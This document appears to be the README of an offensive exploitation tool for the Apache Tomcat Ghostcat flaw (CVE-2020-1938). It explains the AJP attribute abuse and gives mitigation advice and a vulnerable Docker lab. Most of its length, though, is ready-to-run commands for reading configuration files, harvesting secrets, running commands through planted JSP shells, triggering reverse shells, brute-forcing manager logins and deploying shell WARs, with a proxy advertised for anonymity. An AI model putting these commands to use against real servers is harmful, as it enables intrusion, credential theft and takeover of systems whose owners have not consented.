```markdown
#  Ghostcat-PWN — CVE-2020-1938 Exploitation Framework

**Ghostcat-PWN** is a full‑fledged penetration testing tool for the **Apache Tomcat AJP vulnerability (CVE‑2020‑1938)**.  
It combines reconnaissance, file disclosure, command execution, reverse shell, brute‑forcing, and automated loot collection in a single, easy‑to‑use CLI.

---

## Table of Contents

- [ What is Ghostcat?](#-what-is-ghostcat)
- [ Features](#-features)
- [ Installation](#-installation)
- [ Quick Start](#-quick-start)
- [ Usage](#-usage)
  - [Global options](#global-options)
  - [check – Vulnerability check](#check--vulnerability-check)
  - [scan – Port scan](#scan--port-scan)
  - [read – File read](#read--file-read)
  - [exec – Command execution](#exec--command-execution)
  - [revshell – Reverse shell trigger](#revshell--reverse-shell-trigger)
  - [snatch – Automated loot collection](#snatch--automated-loot-collection)
  - [upload – File upload](#upload--file-upload)
  - [rce – One‑shot upload + command](#rce--one-shot-upload--command)
  - [brute – Credential brute‑force](#brute--credential-brute-force)
  - [deploy – WAR deployment](#deploy--war-deployment)
- [ Theory & Attack Chain](#-theory--attack-chain)
- [ Lab Setup (Docker)](#-lab-setup-docker)
- [ Mitigation](#️-mitigation)
- [ Disclaimer](#️-disclaimer)
- [ Author & Credits](#-author--credits)

---

##  What is Ghostcat?

**CVE-2020-1938** is a serious flaw in the **AJP connector** (port 8009) of Apache Tomcat.  
Due to improper handling of AJP attributes, an attacker can trick Tomcat into **reading arbitrary files** inside the web application (`/WEB-INF/web.xml`, configuration files, compiled classes) or, under certain conditions, **evaluating a file as a JSP page** (remote code execution).

Affected versions: Tomcat 6, 7, 8, 9 (< 9.0.31, < 8.5.51, < 7.0.100).  

Ghostcat-PWN automates the entire exploitation process and adds powerful post‑exploitation modules.

---

##  Features

-  **Vulnerability check** – quickly tests if a target is exploitable  
-  **Port scan** – verifies if the AJP port is open  
-  **Arbitrary file read** – steals configuration files, credentials, source code  
-  **Secret extraction** – auto‑detects passwords, JDBC URLs, API keys  
-  **Command execution** – runs system commands via a pre‑uploaded JSP shell  
-  **Reverse shell** – triggers a pre‑positioned reverse shell JSP  
-  **Automated loot** – “snatch” common sensitive files and saves them locally  
-  **File upload** – WebDAV PUT (and Tomcat Manager WAR deploy)  
-  **One‑shot RCE** – uploads a command shell and executes a command in one step  
-  **Brute‑force** – tests default / custom Tomcat Manager credentials  
-  **WAR deployment** – deploys a WAR file using valid Manager credentials  
-  **Proxy support** – SOCKS5 proxy for anonymity  
-  **Verbose mode** – dumps raw AJP packets for debugging  
-  **Modular design** – easily extendable  

---

##  Installation

```bash
git clone https://github.com/j0ck3r/ghostcat-pwn.git
cd ghostcat-pwn
pip install -r requirements.txt   # or just install PySocks manually
```

*Requirements:* Python 3.6+, `PySocks` (optional, for proxy support).  
Install it with `pip install PySocks` if you need the proxy feature.

Make the script executable (optional):
```bash
chmod +x ghostcat-pwn.py
```

---

##  Quick Start

1. **Check a target**  
   ```bash
   python3 ghostcat-pwn.py check example.com 8009
   ```

2. **Scan the AJP port**  
   ```bash
   python3 ghostcat-pwn.py scan example.com 8009
   ```

3. **Read a sensitive file**  
   ```bash
   python3 ghostcat-pwn.py read example.com 8009 /WEB-INF/web.xml
   ```

4. **Execute a command** (requires a JSP shell on the target, e.g. `cmd2.jsp`)  
   ```bash
   python3 ghostcat-pwn.py exec example.com 8009 /cmd2.jsp "id"
   ```

5. **Snatch all common files**  
   ```bash
   python3 ghostcat-pwn.py snatch example.com 8009
   ```

6. **One‑shot RCE** (if WebDAV writable)  
   ```bash
   python3 ghostcat-pwn.py rce example.com 8009 8080 "whoami"
   ```

---

## 📖 Usage

### Global options

| Flag | Description |
|------|-------------|
| `--proxy socks5://host:port` | Route traffic through a SOCKS5 proxy |
| `--verbose` | Print debug information and raw AJP packets |

---

### `check` – Vulnerability check

Tests if the target is vulnerable by attempting to read `/WEB-INF/web.xml`.

```bash
python3 ghostcat-pwn.py check <host> [port]
```

**Options:**
- `--file <path>` – file to read for the test (default: `/WEB-INF/web.xml`)
- `--timeout <sec>` – socket timeout
- `--json` – output result in JSON format

*Example:*
```bash
python3 ghostcat-pwn.py check 192.168.1.10 8009 --json
```

---

### `scan` – Port scan

Checks if the AJP port is open.

```bash
python3 ghostcat-pwn.py scan <host> [port]
```

*Example:*
```bash
python3 ghostcat-pwn.py scan 10.10.10.5 --timeout 2
```

---

### `read` – File read

Reads an arbitrary file inside the web application.

```bash
python3 ghostcat-pwn.py read <host> <ajp_port> <file_path>
```

**Options:**
- `-o / --output <file>` – save content to file
- `--extract` – automatically extract secrets (passwords, keys) from the content
- `--timeout <sec>`

*Examples:*
```bash
python3 ghostcat-pwn.py read target.com 8009 /WEB-INF/classes/jdbc.properties --extract
python3 ghostcat-pwn.py read target.com 8009 /WEB-INF/web.xml -o config.xml
```

---

### `exec` – Command execution

Executes a system command using a JSP shell that reads `request.getAttribute("cmd")`.  
The JSP shell **must already exist** on the target (see [`upload`](#upload--file-upload)).

```bash
python3 ghostcat-pwn.py exec <host> <ajp_port> <jsp_path> <command>
```

*Example:*
```bash
python3 ghostcat-pwn.py exec target.com 8009 /cmd2.jsp "cat /etc/passwd"
```

*Note:* The JSP should be the one generated by this tool (`cmd2.jsp`).  
It expects the command via a **request attribute**, not a GET parameter.

---

### `revshell` – Reverse shell trigger

Triggers a pre‑uploaded reverse shell JSP. The JSP should contain a hardcoded reverse shell command.

```bash
python3 ghostcat-pwn.py revshell <host> <ajp_port> <jsp_path>
```

*Example:*
```bash
python3 ghostcat-pwn.py revshell target.com 8009 /rev.jsp
```
Make sure you have a listener running (`nc -lvnp 4444`).

---

### `snatch` – Automated loot collection

Bulk‑reads common sensitive files and saves them in a local directory.  
Secrets (passwords, JDBC URLs, API keys) are extracted automatically.

```bash
python3 ghostcat-pwn.py snatch <host> <ajp_port>
```

**Options:**
- `--wordlist <file>` – custom list of file paths (one per line)
- `--output-dir <dir>` – directory for loot (default: `loot_<host>_<port>`)
- `--timeout <sec>`

*Example:*
```bash
python3 ghostcat-pwn.py snatch 10.10.10.5 8009 --wordlist mypaths.txt
```

---

### `upload` – File upload

Uploads a file to the target using **HTTP PUT** (WebDAV) or **Tomcat Manager WAR deploy**.

```bash
python3 ghostcat-pwn.py upload <host> <http_port> <local_file> <remote_path>
```

**Options:**
- `--method put|war` – `put` for WebDAV, `war` for Tomcat Manager deployment
- `--username`, `--password` – credentials for authenticated upload (required for `war`)
- `--ssl` – use HTTPS
- `--timeout <sec>`

*Examples:*
```bash
# WebDAV PUT (needs writable WebDAV)
python3 ghostcat-pwn.py upload target.com 8080 cmd2.jsp /webdav/cmd2.jsp

# WAR deploy via Tomcat Manager
python3 ghostcat-pwn.py upload target.com 8080 shell.war /manager/text/deploy \
    --method war --username tomcat --password s3cret
```

---

### `rce` – One‑shot upload + command

Uploads a command JSP shell via WebDAV PUT, then immediately executes a command through it.

```bash
python3 ghostcat-pwn.py rce <host> <ajp_port> <http_port> <command>
```

*Example:*
```bash
python3 ghostcat-pwn.py rce target.com 8009 8080 "id"
```

>  Requires WebDAV to be enabled and writable (`readonly=false`).

---

### `brute` – Credential brute‑force

Tests a list of Tomcat Manager credentials against `/manager/text/list`.

```bash
python3 ghostcat-pwn.py brute <host> <http_port>
```

**Options:**
- `--userlist <file>` – username wordlist
- `--passlist <file>` – password wordlist
- `--timeout <sec>`
- `--quiet` – suppress invalid attempts output

*Example:*
```bash
python3 ghostcat-pwn.py brute target.com 8080 --userlist users.txt --passlist passwords.txt
```

---

### `deploy` – WAR deployment

Deploys a WAR file using known Tomcat Manager credentials.

```bash
python3 ghostcat-pwn.py deploy <host> <http_port> <war_file> --username <user> --password <pass>
```

*Example:*
```bash
python3 ghostcat-pwn.py deploy target.com 8080 my_shell.war --username admin --password admin
```

---

##  Theory & Attack Chain

Ghostcat exploits a flaw in the **AJP13 protocol**. The AJP connector receives a `FORWARD_REQUEST` packet that contains **attributes**.  
Two specific attributes are abused:

- `javax.servlet.include.request_uri`  
- `javax.servlet.include.servlet_path`  

By setting the first to a dummy value (`index`) and the second to an **arbitrary file path** inside the web application, Tomcat’s DefaultServlet or JspServlet processes that file as if it were included.  
This leads to **arbitrary file disclosure** (if the requested file ends with `.txt`) or **JSP evaluation** (if the path ends with `.jsp`), which can result in **remote code execution**.

A typical attack chain is:

1. **Reconnaissance** – find exposed AJP port (8009)  
2. **Ghostcat read** → steal `/WEB-INF/web.xml` and other config files → obtain credentials  
3. **Pivot** – use the credentials to SSH into the server, access databases, or upload a JSP shell (WebDAV, Tomcat Manager)  
4. **RCE** – evaluate the uploaded JSP shell via Ghostcat → execute commands, spawn a reverse shell  
5. **Privilege escalation** – from the limited Tomcat user to root (sudo misconfigs, SUID binaries, etc.)

The tool automates steps 1–4 and provides helpers for step 5 (command execution).

---

##  Lab Setup (Docker)

Build a vulnerable Tomcat environment with WebDAV writable for full testing.

```bash
# 1. Create Dockerfile
cat > Dockerfile <<EOF
FROM tomcat:8.0-jre8

# Create the vulnerable webapp
RUN mkdir -p /usr/local/tomcat/webapps/ROOT/WEB-INF
RUN echo '<web-app>' > /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '  <display-name>Ghostcat Demo</display-name>' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '  <!-- DB_PASSWORD=Sup3rS3cr3t! -->' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '</web-app>' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml

# Enable privileged ROOT context (WebDAV writes)
RUN mkdir -p /usr/local/tomcat/conf/Catalina/localhost
RUN echo '<Context path="/" docBase="ROOT" privileged="true" antiResourceLocking="false" allowLinking="true">' \
         > /usr/local/tomcat/conf/Catalina/localhost/ROOT.xml
RUN echo '  <Resources allowLinking="true" />' >> /usr/local/tomcat/conf/Catalina/localhost/ROOT.xml
RUN echo '</Context>' >> /usr/local/tomcat/conf/Catalina/localhost/ROOT.xml

# Enable WebDAV with readonly=false
RUN sed -i '/<servlet-name>webdav<\/servlet-name>/,/<\/servlet>/ \
           s/<param-value>true<\/param-value>/<param-value>false<\/param-value>/' \
           /usr/local/tomcat/conf/web.xml
EOF

# 2. Build and run
docker build -t ghostcat-lab .
docker run -d -p 8080:8080 -p 8009:8009 --name ghostcat-app ghostcat-lab
```

Now you can test all commands against `localhost`.

---

##  Mitigation

- **Upgrade Tomcat** to a patched version:  
  - 9.0.31+  
  - 8.5.51+  
  - 7.0.100+  
- If AJP is not required, **disable the connector** by commenting out the `<Connector port="8009" protocol="AJP/1.3" ... />` line in `server.xml`.  
- If AJP is needed, **bind it to localhost** only: `address="127.0.0.1"`  
- **Set a required secret** on the AJP connector: `secretRequired="true"` and define a strong `secret`.  

---

##  Disclaimer

This tool is intended **only for authorised security testing** and for educational purposes.  
Misuse of this software is strictly prohibited. The author is not responsible for any damage caused by the improper use of this tool. **Always obtain written permission before testing any system you do not own.**

---

##  Author & Credits

- **Author:** [Deepanshu Khanna](https://github.com/deep1792)  
- **Original vulnerability discovery:** Chaitin Tech  
- **Inspiration:** TryHackMe “Tomghost” room  

---

**⭐ If you find this tool useful, please consider giving it a star on GitHub!**  
*Contributions, issues, and feature requests are welcome.*
```
